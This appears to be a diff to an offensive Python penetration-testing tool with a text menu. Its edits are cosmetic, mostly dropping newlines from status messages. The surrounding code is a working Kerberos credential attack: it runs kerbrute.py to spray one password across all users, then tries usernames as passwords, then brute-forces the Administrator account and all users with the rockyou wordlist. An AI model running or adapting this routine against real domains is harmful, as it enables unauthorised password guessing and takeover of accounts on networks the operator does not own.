@@ -216,7 +216,7 @@ def display():
    print('\u2551')      
 
    print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
-   if CMD == "whoami /all        ":
+   if CMD[:11] == "whoami /all":
       print(colored(CMD[:COL1],colour1), end=' ')
    else:
       print(colored(CMD[:COL1],colour2), end=' ')
@@ -1522,16 +1522,16 @@ while True:
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
          found = 0
-         print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
+         print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
          command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.txt")
 
          test1 = linecache.getline("bpassword1.txt", 1)
@@ -1543,7 +1543,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("\n[*] Now trying all usernames with matching passwords...")
+            print("[*] Now trying all usernames with matching passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
          
          test2 = linecache.getline("bpassword2.txt", 1)
@@ -1555,7 +1555,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("\n[*] Now trying user Administrator with random passwords...")
+            print("[*] Now trying user Administrator with random passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
     
          test3 = linecache.getline("bpassword3.txt", 1)
@@ -1567,7 +1567,7 @@ while True:
             if len(PAS) < COL1: PAS = padding(PAS, COL1)
 
          if found == 0:
-            print("\n[*] Now trying all users with random passwords...")
+            print("[*] Now trying all users with random passwords...")
             command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
      
          test4 = linecache.getline("bpassword4.txt", 1)
